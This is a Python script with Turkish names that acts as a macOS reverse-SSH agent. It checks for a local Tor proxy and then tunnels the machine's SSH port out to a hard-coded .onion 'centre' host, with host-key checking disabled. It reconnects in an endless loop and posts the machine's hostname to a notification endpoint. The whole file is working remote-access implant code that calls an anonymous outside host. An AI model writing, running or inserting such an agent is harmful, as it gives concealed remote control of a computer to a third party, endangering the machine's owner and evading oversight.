#!/usr/bin/env python3
"""
Zihin Koprusu macOS SSH Reverse Ajan
Uzuv: macOS SSH Ajan (macos_ssh_ajan)
Merkez: avlihkczlpvz7cd423a3ydmoemkyeviw6xcya4zcxlqa43biaiaftqyd.onion:22
"""
import json
import socket
import subprocess
import sys
import time
import urllib.request

SUNUCU_HOST  = "avlihkczlpvz7cd423a3ydmoemkyeviw6xcya4zcxlqa43biaiaftqyd.onion"
SUNUCU_PORT  = 22
KULLANICI    = "zihin"
ANAHTAR      = ""
TOR_PROXY    = "127.0.0.1:9050"
YEREL_PORT   = 2222
BILDIRIM_URL = ""
UZUV_ID      = "macos_ssh_ajan"
UZUV_AD      = "macOS SSH Ajan"

def tor_hazirla() -> bool:
    try:
        import socket as _s
        s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("127.0.0.1", 9050))
        s.close()
        return True
    except Exception:
        print("[ZK] Tor proxy 127.0.0.1:9050 ulasilamiyor. Tor Browser veya tor servisini acin.")
        return False


def hazir_bildir():
    if not BILDIRIM_URL:
        return
    try:
        veri = json.dumps({
            "olay": "hazir",
            "uzuv_id": UZUV_ID,
            "uzuv_ad": UZUV_AD,
            "host": socket.gethostname(),
            "zaman": time.strftime("%Y-%m-%d %H:%M:%S"),
            "tip": "mac",
        }).encode("utf-8")
        req = urllib.request.Request(
            BILDIRIM_URL.rstrip("/") + "/uzuv_bildir",
            data=veri,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=15)
        print("[ZK] Merkeze hazir bildirimi gonderildi.")
    except Exception as exc:
        print(f"[ZK] Bildirim gonderilemedi: {exc}")

def baglan() -> subprocess.Popen:
    args = [
        "ssh", "-N", "-R", f"{YEREL_PORT}:localhost:22",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ServerAliveInterval=30",
        "-o", "ExitOnForwardFailure=yes",
        "-p", str(SUNUCU_PORT),
        "-o", f"ProxyCommand=nc -x {TOR_PROXY} %h %p",
    ]
    if ANAHTAR:
        args += ["-i", ANAHTAR]
    args.append(f"{KULLANICI}@{SUNUCU_HOST}")
    return subprocess.Popen(args)

def main():
    print(f"[ZK] macOS ajan basliyor: {UZUV_AD}")
    if not tor_hazirla():
        sys.exit(1)
    bildirildi = False
    while True:
        proc = baglan()
        if not bildirildi:
            time.sleep(3)
            hazir_bildir()
            bildirildi = True
        proc.wait()
        print("[ZK] Baglanti kesildi. 15 saniye sonra yeniden denenecek.")
        time.sleep(15)

if __name__ == "__main__":
    main()
